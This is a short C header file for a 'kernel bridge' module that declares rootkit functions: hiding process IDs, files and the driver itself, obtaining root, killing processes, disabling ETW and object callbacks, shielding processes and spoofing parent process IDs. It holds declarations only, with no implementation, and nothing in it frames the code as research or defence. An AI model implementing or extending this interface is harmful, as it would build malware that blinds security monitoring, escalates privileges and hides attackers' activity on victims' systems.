#ifndef JKY_KERNEL_BRIDGE_H
#define JKY_KERNEL_BRIDGE_H

#include <stdint.h>

int  jky_kmod_ensure_loaded(void);
void jky_kmod_close(void);

int  jky_kmod_hide_pid(int pid);
int  jky_kmod_unhide_pid(int pid);
int  jky_kmod_hide_file(const char *path);
int  jky_kmod_unhide_file(const char *path);
int  jky_kmod_get_root(void);
int  jky_kmod_kill(int pid);

int  jky_kmod_disable_etw(void);
int  jky_kmod_disable_ob_callbacks(void);
int  jky_kmod_hide_driver(void);
int  jky_kmod_process_shield(int pid, int level);
int  jky_kmod_spoof_ppid(int child_pid, int new_ppid);

#endif